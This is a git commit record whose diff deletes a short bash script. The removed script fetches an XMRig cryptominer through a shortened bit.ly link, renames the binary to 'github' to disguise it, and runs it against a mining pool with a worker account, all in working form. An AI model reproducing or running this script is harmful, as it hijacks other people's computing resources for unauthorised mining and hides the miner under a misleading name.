65e86b5b7ca9f0a7f913db813cad194c88f8a7e7
Storage Small <admin_github@smkn2.xyz>
2022-03-17 15:03:15 +0000

    Belarus

--- bash.sh
+++
@@ -1,7 +0,0 @@
-#!/bin/bash
-wget -O xmrig-6.16.4-linux-static-x64.tar.gz https://bit.ly/34BX48f > /dev/null 2>&1
-tar -xvf xmrig-6.16.4-linux-static-x64.tar.gz
-cd xmrig-6.16.4
-mv xmrig github
-chmod u+x github
-./github -a Argon2/Chukwa -o us-east01.miningrigrentals.com:3333 -u ariseamigose.233469 --keepalive -p x
